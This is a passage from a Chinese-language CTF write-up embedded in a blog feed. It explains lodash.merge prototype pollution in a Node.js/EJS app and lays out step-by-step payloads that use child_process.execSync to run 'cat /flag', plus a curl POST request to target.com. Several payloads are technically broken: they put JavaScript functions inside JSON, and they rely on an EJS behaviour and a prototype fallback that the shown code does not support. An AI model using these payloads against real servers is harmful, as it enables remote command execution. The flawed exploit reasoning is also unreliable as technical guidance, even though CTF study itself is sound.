<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    app.all(&#x27;/&#x27;<span class="punctuation">,</span> (req<span class="punctuation">,</span> res) =&gt; <span class="punctuation">&#123;</span></span><br><span class="line">        let data = req.session.data || <span class="punctuation">&#123;</span>language<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span> category<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        if (req.method == &#x27;POST&#x27;) <span class="punctuation">&#123;</span></span><br><span class="line">            data = lodash.merge(data<span class="punctuation">,</span> req.body)</span><br><span class="line">            req.session.data = data</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">        res.render(&#x27;index&#x27;<span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">            language<span class="punctuation">:</span> data.language<span class="punctuation">,</span> </span><br><span class="line">            category<span class="punctuation">:</span> data.category</span><br><span class="line">        <span class="punctuation">&#125;</span>)</span><br><span class="line">    <span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="解决步骤与原理详解"><a href="#解决步骤与原理详解" class="headerlink" title="解决步骤与原理详解"></a>解决步骤与原理详解</h3><h4 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1. 漏洞分析"></a><strong>1. 漏洞分析</strong></h4><p>题目代码中使用了存在漏洞的 <code>lodash.merge</code> 方法合并用户输入（<code>req.body</code>），且未过滤 <code>__proto__</code> 或 <code>constructor</code> 属性。旧版 Lodash（如 4.17.10 之前）的 <code>merge</code> 方法未正确处理原型链属性，导致攻击者可通过注入 <code>__proto__</code> 污染全局对象原型。</p>
+<hr>
+<h4 id="2-漏洞利用步骤"><a href="#2-漏洞利用步骤" class="headerlink" title="2. 漏洞利用步骤"></a><strong>2. 漏洞利用步骤</strong></h4><h5 id="步骤1：确认漏洞存在"><a href="#步骤1：确认漏洞存在" class="headerlink" title="步骤1：确认漏洞存在"></a><strong>步骤1：确认漏洞存在</strong></h5><ul>
+<li><strong>测试Payload</strong>：发送以下 POST 请求，尝试污染 <code>Object.prototype</code>：<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;polluted&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>验证污染</strong>：在后续请求中，检查任意对象的 <code>polluted</code> 属性：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务端代码示例</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>); <span class="comment">// 若输出 &quot;test&quot;，则污染成功</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="步骤2：利用污染实现RCE"><a href="#步骤2：利用污染实现RCE" class="headerlink" title="步骤2：利用污染实现RCE"></a><strong>步骤2：利用污染实现RCE</strong></h5><p>目标是通过污染原型链，在模板渲染时触发代码执行。<br><strong>EJS模板特性</strong>：EJS 在渲染时，若模板中访问了对象属性，且该属性被污染为一个函数，则会执行该函数。</p>
+<p><strong>构造恶意Payload</strong>：<br>覆盖 <code>Object.prototype</code> 的某个方法（如 <code>toString</code>），插入恶意代码：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;toString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;() =&gt; &#123; return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString() &#125;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>或更隐蔽的方式：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;toString&quot;</span><span class="punctuation">:</span> function() <span class="punctuation">&#123;</span> </span><br><span class="line">        return this.flag ||= require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString();</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="步骤3：触发模板渲染执行代码"><a href="#步骤3：触发模板渲染执行代码" class="headerlink" title="步骤3：触发模板渲染执行代码"></a><strong>步骤3：触发模板渲染执行代码</strong></h5><p>假设模板 <code>index.ejs</code> 中有如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= language %&gt;  // 或其他输出点</span><br></pre></td></tr></table></figure>
+<p>当 <code>language</code> 未定义时，EJS 会尝试从原型链查找 <code>language</code> 属性。若 <code>Object.prototype.language</code> 被污染为恶意函数，则会执行该函数。</p>
+<p><strong>最终Payload</strong>：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> function() <span class="punctuation">&#123;</span></span><br><span class="line">      return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString();</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="步骤4：发送请求并获取flag"><a href="#步骤4：发送请求并获取flag" class="headerlink" title="步骤4：发送请求并获取flag"></a><strong>步骤4：发送请求并获取flag</strong></h5><ol>
+<li><strong>发送POST请求</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://target.com/ \</span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;language&quot;: function()&#123; return require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString() &#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>触发模板渲染</strong>：<br>访问首页 <code>GET /</code>，模板会尝试渲染 <code>language</code> 属性，执行污染后的函数，返回flag。</li>
+</ol>
+<h4 id="3-技术原理"><a href="#3-技术原理" class="headerlink" title="3. 技术原理"></a><strong>3. 技术原理</strong></h4><ul>
+<li><strong>原型链污染</strong>：通过 <code>lodash.merge</code> 将 <code>__proto__</code> 注入到 <code>data</code> 对象，污染 <code>Object.prototype</code>。</li>
+<li><strong>模板引擎触发</strong>：EJS 渲染时访问被污染属性（如 <code>language</code>），调用已覆盖的函数，执行任意命令。</li>
+<li><strong>RCE链</strong>：<br>污染函数 → 模板调用函数 → 执行系统命令 → 返回flag。</li>
+</ul>
+<p>🤔</p>
+<ul>
+<li><strong>关键点</strong>：  <ol>
+<li>识别 <code>lodash.merge</code> 合并用户输入。  </li>
+<li>构造 <code>__proto__</code> 或 <code>constructor.prototype</code> 污染原型链。  </li>
+<li>利用模板引擎渲染触发恶意代码。</li>
+</ol>
+</li>
+<li><strong>最终效果</strong>：通过污染 <code>Object.prototype.language</code>，在渲染时执行 <code>cat /flag</code>，直接获取flag。</li>
 </ul>
 ]]></content>
       <tags>
